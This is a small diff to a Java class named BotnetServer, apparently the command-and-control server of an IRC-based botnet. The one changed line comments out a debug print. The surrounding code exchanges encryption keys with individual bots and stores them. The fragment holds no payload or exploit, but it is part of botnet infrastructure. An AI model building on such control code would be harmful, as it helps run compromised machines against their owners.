@@ -171,7 +171,7 @@ public class BotnetServer extends PircBot {
 						chat.sendLine(key); // send key
 						chat.sendLine(info.toString()); // send public info
 						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n"); // get public key
-						System.out.println("key: " + otherKey);
+						//System.out.println("key: " + otherKey);
 						m.handShake(otherKey);
 						botKeys.put(bots[i].getNick(), m);
 						chat.close();
